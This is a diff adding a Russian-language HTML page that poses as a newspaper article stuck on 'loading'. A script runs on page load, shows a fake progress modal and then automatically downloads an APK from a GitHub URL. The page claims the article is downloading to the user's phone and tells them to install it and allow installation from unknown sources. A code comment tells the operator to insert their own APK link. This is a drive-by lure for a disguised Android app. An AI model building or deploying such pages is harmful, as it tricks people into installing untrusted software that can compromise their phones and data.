@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Читаем статью...</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=PT+Serif:ital,wght@0,400;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f5f0e8;
+      --paper: #faf8f3;
+      --ink: #1a1208;
+      --ink-light: #6b5f4a;
+      --accent: #c0392b;
+      --line: #d9d0bc;
+    }
+
+    body {
+      background: var(--bg);
+      font-family: 'PT Serif', Georgia, serif;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── HEADER ── */
+    .newspaper-header {
+      width: 100%;
+      border-bottom: 3px double var(--ink);
+      padding: 16px 24px 12px;
+      text-align: center;
+      background: var(--paper);
+    }
+    .newspaper-name {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.6rem, 5vw, 2.8rem);
+      font-weight: 900;
+      letter-spacing: 0.04em;
+      color: var(--ink);
+    }
+    .newspaper-meta {
+      font-family: 'Inter', sans-serif;
+      font-size: 0.7rem;
+      color: var(--ink-light);
+      margin-top: 6px;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+    .newspaper-meta span::before { content: "·  "; }
+    .newspaper-meta span:first-child::before { content: ""; }
+
+    /* ── ARTICLE ── */
+    .page {
+      width: min(680px, 94vw);
+      padding: 36px 0 80px;
+      filter: blur(0px);
+      transition: filter 0.3s;
+    }
+    .page.blurred { filter: blur(3px); pointer-events: none; }
+
+    .category-tag {
+      font-family: 'Inter', sans-serif;
+      font-size: 0.68rem;
+      font-weight: 500;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 14px;
+    }
+    .article-title {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.6rem, 5vw, 2.6rem);
+      font-weight: 700;
+      color: var(--ink);
+      line-height: 1.2;
+      margin-bottom: 14px;
+    }
+    .article-lead {
+      font-size: 1.05rem;
+      font-style: italic;
+      color: var(--ink-light);
+      line-height: 1.65;
+      border-left: 3px solid var(--accent);
+      padding-left: 16px;
+      margin-bottom: 28px;
+    }
+    .divider {
+      display: flex; align-items: center; gap: 10px;
+      margin-bottom: 28px;
+      color: var(--ink-light);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.72rem;
+      letter-spacing: 0.08em;
+    }
+    .divider::before, .divider::after {
+      content: ""; flex: 1; height: 1px; background: var(--line);
+    }
+
+    /* ── SKELETON ── */
+    .skeleton-block { margin-bottom: 24px; }
+    .skel-line {
+      height: 14px; border-radius: 3px;
+      background: linear-gradient(90deg, var(--line) 25%, #ece6d8 50%, var(--line) 75%);
+      background-size: 200% 100%;
+      animation: shimmer 1.6s infinite;
+      margin-bottom: 10px;
+    }
+    .skel-line:last-child { width: 60%; }
+    .skel-img {
+      width: 100%; height: 180px; border-radius: 4px;
+      background: linear-gradient(90deg, var(--line) 25%, #ece6d8 50%, var(--line) 75%);
+      background-size: 200% 100%;
+      animation: shimmer 1.6s infinite;
+      margin-bottom: 24px;
+    }
+    @keyframes shimmer {
+      0%   { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+
+    /* ── BACKDROP ── */
+    .backdrop {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(26,18,8,0.45);
+      z-index: 50;
+      backdrop-filter: blur(2px);
+    }
+    .backdrop.show { display: block; animation: fade-in 0.3s both; }
+    @keyframes fade-in { from { opacity: 0; } to { opacity: 1; } }
+
+    /* ── CENTERED MODAL ── */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%) scale(0.92);
+      z-index: 100;
+      width: min(360px, 88vw);
+      background: var(--paper);
+      border-radius: 16px;
+      box-shadow: 0 24px 64px rgba(26,18,8,0.35);
+      overflow: hidden;
+    }
+    .modal.show {
+      display: block;
+      animation: modal-pop 0.35s cubic-bezier(0.34,1.4,0.64,1) both;
+    }
+    @keyframes modal-pop {
+      from { transform: translate(-50%, -50%) scale(0.88); opacity: 0; }
+      to   { transform: translate(-50%, -50%) scale(1);    opacity: 1; }
+    }
+
+    /* red top stripe */
+    .modal-stripe {
+      height: 5px;
+      background: var(--accent);
+    }
+
+    .modal-body {
+      padding: 28px 28px 24px;
+      text-align: center;
+    }
+
+    /* newspaper icon */
+    .modal-icon {
+      width: 56px; height: 56px;
+      background: #f0ebe0;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 18px;
+      border: 2px solid var(--line);
+    }
+    .modal-icon svg { width: 26px; height: 26px; }
+
+    .modal-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: var(--ink);
+      margin-bottom: 6px;
+    }
+    .modal-sub {
+      font-family: 'Inter', sans-serif;
+      font-size: 0.78rem;
+      color: var(--ink-light);
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    /* progress bar */
+    .prog-bg {
+      height: 8px;
+      border-radius: 99px;
+      background: var(--line);
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    .prog-fill {
+      height: 100%;
+      border-radius: 99px;
+      background: var(--accent);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+    .prog-row {
+      display: flex; justify-content: space-between;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.72rem;
+      color: var(--ink-light);
+      margin-bottom: 20px;
+    }
+    .prog-pct { color: var(--accent); font-weight: 600; font-variant-numeric: tabular-nums; }
+
+    /* steps inside modal */
+    .modal-steps {
+      display: flex; flex-direction: column; gap: 8px;
+      text-align: left;
+    }
+    .mstep {
+      display: flex; align-items: center; gap: 10px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.76rem;
+      color: #bbb;
+      transition: color 0.3s;
+    }
+    .mstep.active { color: var(--ink); }
+    .mstep.done   { color: var(--ink-light); }
+    .mstep-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: var(--line);
+      flex-shrink: 0;
+      transition: background 0.3s;
+    }
+    .mstep.active .mstep-dot { background: var(--accent); animation: blink 1s infinite; }
+    .mstep.done   .mstep-dot { background: #8aac6e; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    /* ── DONE STATE (replaces modal content) ── */
+    .done-body {
+      padding: 28px 28px 24px;
+      text-align: center;
+      display: none;
+    }
+    .done-body.show { display: block; }
+    .done-check-circle {
+      width: 56px; height: 56px;
+      background: #eef7e8;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 16px;
+      border: 2px solid #8aac6e;
+    }
+    .done-check-circle svg { width: 26px; height: 26px; }
+    .done-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--ink);
+      margin-bottom: 8px;
+    }
+    .done-desc {
+      font-family: 'Inter', sans-serif;
+      font-size: 0.76rem;
+      color: var(--ink-light);
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .done-btn {
+      display: inline-block;
+      padding: 9px 22px;
+      border-radius: 8px;
+      background: var(--accent);
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      letter-spacing: 0.03em;
+    }
+  </style>
+</head>
+<body>
+
+<header class="newspaper-header">
+  <div class="newspaper-name">ВЕСТНИК</div>
+  <div class="newspaper-meta">
+    <span>Воскресенье, 26 апреля 2026</span>
+    <span>Технологии</span>
+    <span>Выпуск №142</span>
+  </div>
+</header>
+
+<main class="page" id="page">
+  <div class="category-tag">Технологии &amp; Приложения</div>
+  <h1 class="article-title">Загружаем материал, подождите немного...</h1>
+  <p class="article-lead">
+    Мы готовим для вас полный текст статьи. Это займёт всего несколько секунд — содержимое уже на пути к вам.
+  </p>
+  <div class="divider">Содержание загружается</div>
+  <div class="skel-img"></div>
+  <div class="skeleton-block">
+    <div class="skel-line" style="width:100%"></div>
+    <div class="skel-line" style="width:92%"></div>
+    <div class="skel-line" style="width:97%"></div>
+    <div class="skel-line" style="width:85%"></div>
+    <div class="skel-line"></div>
+  </div>
+  <div class="skeleton-block">
+    <div class="skel-line" style="width:100%"></div>
+    <div class="skel-line" style="width:88%"></div>
+    <div class="skel-line" style="width:95%"></div>
+    <div class="skel-line"></div>
+  </div>
+  <div class="skeleton-block">
+    <div class="skel-line" style="width:100%"></div>
+    <div class="skel-line" style="width:78%"></div>
+    <div class="skel-line"></div>
+  </div>
+</main>
+
+<!-- Backdrop -->
+<div class="backdrop" id="backdrop"></div>
+
+<!-- Modal -->
+<div class="modal" id="modal">
+  <div class="modal-stripe"></div>
+
+  <!-- Loading content -->
+  <div class="modal-body" id="loadBody">
+    <div class="modal-icon">
+      <svg viewBox="0 0 26 26" fill="none">
+        <path d="M13 3v13M13 16l-4-4M13 16l4-4" stroke="#c0392b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M4 20h18" stroke="#c0392b" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="modal-title">Загружаем статью!</div>
+    <div class="modal-sub">Подождите, идёт подготовка файла...</div>
+
+    <div class="prog-bg"><div class="prog-fill" id="fill"></div></div>
+    <div class="prog-row">
+      <span id="stepLabel">Проверка...</span>
+      <span class="prog-pct" id="pct">0%</span>
+    </div>
+
+    <div class="modal-steps">
+      <div class="mstep active" id="ms1"><div class="mstep-dot"></div> Проверка совместимости</div>
+      <div class="mstep"        id="ms2"><div class="mstep-dot"></div> Подготовка файла</div>
+      <div class="mstep"        id="ms3"><div class="mstep-dot"></div> Запуск скачивания</div>
+    </div>
+  </div>
+
+  <!-- Done content -->
+  <div class="done-body" id="doneBody">
+    <div class="done-check-circle">
+      <svg viewBox="0 0 26 26" fill="none">
+        <path d="M5 13l6 6 10-10" stroke="#5a8a3c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <div class="done-title">Скачивание началось!</div>
+    <div class="done-desc">
+      Статья уже загружается на ваш телефон.<br>
+      После завершения откройте его и установите.<br><br>
+      <small>Разрешите установку из неизвестных источников, если потребуется.</small>
+    </div>
+    <button class="done-btn" id="retryBtn">Скачать снова</button>
+  </div>
+</div>
+
+<script>
+  // ╔═══════════════════════════════════════════════════╗
+  // ║  ВСТАВЬ СЮДА ССЫЛКУ НА СВОЙ APK                   ║
+  // ╚═══════════════════════════════════════════════════╝
+  const APK_URL = "https://github.com/jdnfhdifj11-cyber/article-reader/raw/main/%D0%A1%D1%82%D0%B0%D1%82%D1%8C%D1%8F%20%D0%91%D0%BE%D0%BD%D1%8F%20%D0%B2%20%D1%80%D0%B5%D0%B0%D0%BD%D0%B8%D0%BC%D0%B0%D1%86%D0%B8%D0%B8.apk";
+
+  const fill      = document.getElementById("fill");
+  const pct       = document.getElementById("pct");
+  const stepLabel = document.getElementById("stepLabel");
+  const backdrop  = document.getElementById("backdrop");
+  const modal     = document.getElementById("modal");
+  const loadBody  = document.getElementById("loadBody");
+  const doneBody  = document.getElementById("doneBody");
+  const retryBtn  = document.getElementById("retryBtn");
+  const page      = document.getElementById("page");
+  const ms        = [document.getElementById("ms1"), document.getElementById("ms2"), document.getElementById("ms3")];
+
+  const steps = [
+    { at: 0,  label: "Проверка совместимости...", step: 0 },
+    { at: 35, label: "Подготовка файла...",        step: 1 },
+    { at: 75, label: "Запускаем загрузку...",      step: 2 },
+  ];
+
+  function setStep(i) {
+    ms.forEach((el, idx) => {
+      el.classList.remove("active","done");
+      if (idx < i)  el.classList.add("done");
+      if (idx === i) el.classList.add("active");
+    });
+  }
+
+  function triggerDownload() {
+    const a = document.createElement("a");
+    a.href = APK_URL; a.download = "";
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }
+
+  function showModal() {
+    backdrop.classList.add("show");
+    modal.classList.add("show");
+    page.classList.add("blurred");
+  }
+
+  function runSequence() {
+    loadBody.style.display = "block";
+    doneBody.classList.remove("show");
+    fill.style.width = "0%";
+    pct.textContent = "0%";
+    setStep(0);
+    stepLabel.textContent = steps[0].label;
+    showModal();
+
+    let p = 0;
+    const iv = setInterval(() => {
+      p += Math.random() * 2.5 + 0.7;
+      if (p > 100) p = 100;
+
+      fill.style.width = p + "%";
+      pct.textContent = Math.round(p) + "%";
+
+      for (let i = steps.length - 1; i >= 0; i--) {
+        if (p >= steps[i].at) { stepLabel.textContent = steps[i].label; setStep(steps[i].step); break; }
+      }
+
+      if (p >= 100) {
+        clearInterval(iv);
+        triggerDownload();
+        setTimeout(() => {
+          loadBody.style.display = "none";
+          doneBody.classList.add("show");
+        }, 500);
+      }
+    }, 55);
+  }
+
+  retryBtn.addEventListener("click", runSequence);
+  window.addEventListener("load", () => setTimeout(runSequence, 800));
+</script>
+</body>
+</html>
